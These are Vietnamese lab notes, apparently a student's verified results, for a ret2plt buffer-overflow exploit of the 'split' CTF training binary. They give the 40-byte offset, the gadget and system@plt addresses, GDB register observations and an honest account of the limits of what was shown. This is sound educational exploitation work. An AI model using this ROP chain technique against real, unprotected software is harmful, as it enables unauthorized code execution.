# Kết quả demo `split` (x86_64) — số liệu THẬT đã xác minh

Ngày chạy: **2026-11-05**. Môi trường: Kali amd64 (VM, UTM), user `anhtruong`.
Đây là bằng chứng của S05, dùng để trích vào slide. Mọi số dưới đây đo trên chính
binary đang dùng, không chép từ nguồn ngoài.

## Môi trường & binary
- `uname -m` = `x86_64`; pwntools 4.15.0; gdb/checksec/ROPgadget/objdump sẵn có.
- `file split`: ELF 64-bit LSB executable, x86-64, dynamically linked,
  interp `/lib64/ld-linux-x86-64.so.2`, **not stripped**, BuildID(sha1)=`98755e64e1d0c1bff48fccae1dca9ee9e3c609e2`.
- `sha256sum split` = `bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9`.
- `checksec`: **Partial RELRO | No canary | NX enabled | No PIE (0x400000)**.
- `cat /proc/sys/kernel/randomize_va_space` = **2** (ASLR full).

## Lỗi nền & điều kiện (mức: đã đo)
- Hàm đọc input: `pwnme` (xác nhận lại bằng objdump ở bước GDB).
- **Offset tới saved return address = 40.** Đo bằng cyclic: RIP lúc crash =
  `0x6161616c6161616b` = `"kaaalaaa"` → `"kaaa"` ở offset 40.
  (Lưu ý dạy học: đọc tại RSP ra 48 vì `ret` đã pop 8 byte; 48 − 8 = 40.)
- No canary → ghi tràn chạm thẳng saved RIP; No PIE → địa chỉ code/.data cố định.

## Chuỗi khai thác (ret2plt) — địa chỉ thật
| Thành phần | Địa chỉ | Vai trò |
|---|---|---|
| đệm `b"A"*40` | — | lấp tới saved RIP |
| `ret` (căn lề) | `0x40053e` | căn stack 16-byte cho `movaps` trong system |
| `pop rdi ; ret` | `0x4007c3` | nạp đối số vào RDI (ABI System V AMD64) |
| chuỗi `/bin/cat flag.txt` (`usefulString`) | `0x601060` | con trỏ cho RDI, nằm sẵn trong .data |
| `system@plt` | `0x400560` | gọi `system(RDI)` |

## Kết quả
- Lần 1 (2026-11-05): **in flag `ROPE{a_placeholder_32byte_flag!}`**, exit sau interactive.
- Lần 2: `[CHƯA CHẠY — cần lặp lần 2 cho yêu cầu đề]`.

## Quan sát GDB (2026-11-05) — ảnh 05
Chạy `gdb -batch -ex "break system" -ex "run < payload.bin" ...`:
- Dừng tại `system () from /usr/lib/x86_64-linux-gnu/libc.so.6`, `rip=0x7ffff7e011b0 <system>`.
- `RDI = 0x601060` và `0x601060 <usefulString>: "/bin/cat flag.txt"` → **đối số 1 trỏ đúng chuỗi**.
- `rsp = 0x7fffffffdcd8` (tận cùng …8) → thỏa `RSP%16==8` ở cửa vào hàm → `ret` căn lề đã đúng, `movaps` không fault.
- Lưu ý: địa chỉ libc `0x7ffff7e0…` chỉ thấy được vì **GDB tắt ASLR** (lab); exploit chỉ dùng `system@plt=0x400560` cố định (No PIE) → đây là **ret2plt**, chưa vượt ASLR libc.

## Mức bằng chứng đã đạt / chưa đạt
- [x] ghi vượt / crash (cyclic → SIGSEGV)
- [x] chiếm luồng (RIP = giá trị ta kiểm soát, offset 40 đúng)
- [x] đạt mục tiêu CTF (ra flag)
- [x] **QUAN SÁT trực tiếp** RDI = `0x601060` trỏ `"/bin/cat flag.txt"` tại `system` (GDB — ảnh 05)
- [ ] chạy lặp lần 2 ngoài GDB (ảnh 06 + `run_log.txt`)

## Ranh giới trung thực (bắt buộc nói trên slide)
Đây là **ret2plt**: nhảy vào `system@plt` của chương trình, dùng địa chỉ **cố định do No PIE**.
KHÔNG chứng minh đã tính được libc base hay vượt ASLR của libc (ASLR vẫn đang =2).
Direct ret2libc là nhánh lý thuyết/mở rộng, chưa thực hiện.
